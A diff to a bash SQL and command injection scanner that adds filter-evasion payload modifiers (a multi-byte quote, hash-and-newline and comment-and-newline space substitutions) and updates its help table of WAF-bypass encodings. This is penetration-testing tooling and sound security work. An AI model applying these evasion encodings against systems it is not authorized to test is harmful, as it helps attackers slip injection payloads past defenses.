@@ -42,6 +42,11 @@ if [ true = "$m" ] ; then #UTF-8 full-width single quote
 	inputbuffer=`echo $inputbuffer | replace "'" "%ef%bc%87"`
 fi
 
+if [ true = "$z" ] ; then #multi byte quote
+	inputbuffer=`echo $inputbuffer | replace "'" "%bf%27"`
+fi
+
+
 #URL encoding occurs unless we are doing URI unicode encoding 
 #if [ false = "$O" ] ; then  
 encodeoutput=`echo $inputbuffer | replace " " "%20" | replace "." "%2e" | replace "<" "%3c" | replace ">" "%3e" | replace "?" "%3f" | replace "+" "%2b" | replace "*" "%2a" | replace ";" "%3b" | replace ":" "%3a" | replace "(" "%28" | replace ")" "%29" | replace "," "%2c" | replace "/" "%2f"` 
@@ -60,7 +65,13 @@ if [ true = "$V" ] ; then #double URL encoding
 	encodeoutput=`echo $encodeoutput | replace "%" "%25"`
 fi
 
+if [ true = "$p" ] ; then #hash + noise + newline
+	encodeoutput=`echo $encodeoutput | replace "%20" "%234i5ugh4iuh%0a"`
+fi
 
+if [ true = "$w" ] ; then #comment + newline
+	encodeoutput=`echo $encodeoutput | replace "%20" "%2d%2d%0a"`
+fi
 
 #--------------
 
@@ -1399,10 +1410,14 @@ J=false
 N=false
 g=false
 m=false
+p=false
+w=false
+z=false
 
 #################command switch parser section#########################
+#available: g,y (problematic),z
 
-while getopts l:c:t:nsqehx:d:bu:P:v:L:M:Q:I:T:C:rWS:ABjYfoD:FGHRZYVUOKJENakm: namer; do
+while getopts l:c:t:nsqehx:d:bu:P:v:L:M:Q:I:T:C:rWS:ABjYfoD:FGHRZYVUOKJENakmpwyz: namer; do
     case $namer in 
     l)  #path to burp log to parse
         burplog=$OPTARG
@@ -1547,6 +1562,15 @@ while getopts l:c:t:nsqehx:d:bu:P:v:L:M:Q:I:T:C:rWS:ABjYfoD:FGHRZYVUOKJENakm: na
     m) # UTF8 full-width quote ''' => '%EF%BC%87'
 	m=true  
 	;;
+    p) # hash + noise + newline
+	p=true  
+	;;
+    w) # comment + newline
+	w=true  
+	;;
+    z) # Multi Byte Quote
+	z=true  
+	;;
     esac
 done
 
@@ -1556,7 +1580,7 @@ if [ true = "$h" ] || ["$1" == ""] 2>/dev/null ; then
 	echo "Written by Toby Clarke"
 	echo "Influenced by code written by Brian Holyfield"
 	echo "Common errors strings taken from Adam Muntner's fuzzdb regex/errors.txt"
-	echo ""
+	echo "Filter evasion ideas taken from sqlmap's tamper scripts"
 	echo "Required arguments:"
 	echo "  -t <host> Target hostname or IP address. No trailing slash."
 	echo "AND one of:"
@@ -1575,24 +1599,27 @@ if [ true = "$h" ] || ["$1" == ""] 2>/dev/null ; then
         echo "  -b OS Command injection"
         echo "  -C <path to payload list text file> Use a custom payload list. Where the character 'X' is included in a payload, it may be replaced with a time delay value."
         #echo "  -Y XSS injection (very basic!)"
-	echo "Optional payload modifiers:                Before     After                         Breaks normal query?"
-	echo "  -Y Inline SQL comment instead of spaces  ' '        '/**/'                        No                  "
-	echo "  -N Intermediary chars instead of spaces  ' '        '%2f%2a%0B%0C%0D%0A%09%2a%2f' No                  "              
-	echo "  -V Double URL encoding                   '%27'      '%2527'                       Yes                 "
-	echo "  -U Case variation                        'select'   'sElEcT'                      No                  "
-	#echo "  -O MYSQL inline comments                  'select'  'se/**/lect'                 No                  "
-	echo "  -E Replace equals operator with like     '='        'like'                        No                  "
-	echo "  -J Nesting                               'select'   'selselectect'                Yes                 "
-	echo "  -O URI unicode encoding                  'or'       '%u006f%u0072'                No                  "
-	echo "  -m UTF-8 full-width quote                '''        '%EF%BC%87'                   Yes                 "
+	echo "Optional payload modifiers:             Before     After                         DBMS       "
+	echo "  -Y Inline SQL comment space           ' '        '/**/'                        All        "
+	echo "  -N Intermediary chars space           ' '        '%2f%2a%0B%0C%0D%0A%09%2a%2f' All        "              
+	echo "  -p Hash+noise+newline space           ' '        '#ihffeg%0a'                  MYSQL      "
+	echo "  -w Comment+newline space              ' '        '%2d%2d%0a'                   MYSQL,MSSQL"
+	echo "  -m UTF-8 full-width quote             '''        '%EF%BC%87'                   All        "
+	echo "  -z Multi-byte quote                   '''        '%bf%27'                      MYSQL      "
+	echo "  -U Case variation                     'select'   'sElEcT'                      All        "
+	#echo "  -O MYSQL inline comments             'select'   'se/**/lect'                  MYSQL "
+	echo "  -E Replace equals operator with like  '='        'like'                        All        "
+	echo "  -J Nesting                            'select'   'selselectect'                All        "
+	echo "  -O URI unicode encoding               'or'       '%u006f%u0072'                All        "
+	echo "  -V Double URL encoding                '%27'      '%2527'                       All        "
 	echo "  -A Prepend payloads with %00"
 	echo "  -B Prepend payloads with %0d%0a"
 	echo "  -W HTTP Method Swapping mode: GET requests are converted to POSTs and vice-versa. These new requests are tested IN ADDITION to the original."
 	echo "Various extra options:"
+	echo "  -c <cookie> Add cookies. Enclose in single quotes: -c 'foo=bar'. Multiple cookies must be defined without spaces: -c 'foo=bar;sna=fu'"
 	echo "  -a <headername:headervalue> Add a header like this (basic HTTP auth) example: -a 'Authorization: Basic d2ViZ29hdDp3ZWJnb2F0'"	
 	echo "  -D <mssql, oracle, mysql> Specify a back end DBMS if known. Reduces the number of payloads. Options are currently mssql, oracle or mysql"
 	echo "  -x <delay in seconds> Time delay for SQL and command injection - if not provided, this will default to $timedelay seconds"
-	echo "  -c <cookie> Add cookies. Enclose in single quotes: -c 'foo=bar'. Multiple cookies must be defined without spaces: -c 'foo=bar;sna=fu'"
 	echo "  -d <default error string> Define a detection string (inside double quotes) to identify a default error page"
 	echo "  -v <http://proxy:port> Define a proxy. Currently, I crash burp. Dont know why."
 	echo "  -L <URL of session liveness check page> Conduct an access check on a given page to determine the session cookie is valid"	
